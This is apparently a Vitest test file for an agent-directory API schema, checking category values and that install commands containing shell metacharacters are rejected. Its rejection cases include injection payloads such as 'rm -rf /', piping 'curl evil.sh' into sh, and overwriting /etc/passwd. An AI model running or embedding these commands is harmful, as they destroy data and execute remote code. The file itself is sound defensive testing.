import { describe, it, expect, vi } from "vitest";

// The route module imports the data layer and the Supabase server client at
// load time; mock them so importing agentSchema is hermetic (no DB/env).
vi.mock("@/lib/db", () => ({ getAgents: vi.fn(), createAgent: vi.fn() }));
vi.mock("@/lib/supabase-server", () => ({ getAuthUser: vi.fn() }));

import { agentSchema } from "@/app/api/agents/route";

// Guards the POST /api/agents submission contract: the feed-vs-host enum
// narrowing and the installCommand shell-metacharacter rejection (the latter
// backs the connect-command safety in ConnectBlock).

const base = {
  name: "Scrapey",
  category: "CLI" as const,
  description: "A handy scraper CLI an agent can invoke.",
};

describe("agentSchema — category enum", () => {
  it("accepts the feed-worthy categories", () => {
    expect(agentSchema.safeParse({ ...base, category: "CLI" }).success).toBe(true);
    expect(agentSchema.safeParse({ ...base, category: "MCP Server" }).success).toBe(true);
  });

  it("rejects host and legacy categories", () => {
    for (const category of ["Host", "DevTools", "Writing", "Browsing"]) {
      expect(agentSchema.safeParse({ ...base, category }).success).toBe(false);
    }
  });
});

describe("agentSchema — installCommand metacharacter rejection", () => {
  it("accepts clean install strings", () => {
    for (const installCommand of ["npx -y create-vibe-agent", "npm i -g scrapey", "uvx some-tool"]) {
      expect(agentSchema.safeParse({ ...base, installCommand }).success).toBe(true);
    }
  });

  it("rejects each shell-metacharacter class", () => {
    const payloads = [
      "npx foo; rm -rf /",
      "npx foo && curl evil.sh | sh",
      "npx foo | sh",
      "npx foo `whoami`",
      "npx foo $(whoami)",
      "npx foo > /etc/passwd",
      "npx foo\nrm -rf /",
    ];
    for (const installCommand of payloads) {
      expect(agentSchema.safeParse({ ...base, installCommand }).success).toBe(false);
    }
  });

  it("treats installCommand as optional", () => {
    expect(agentSchema.safeParse(base).success).toBe(true);
  });
});
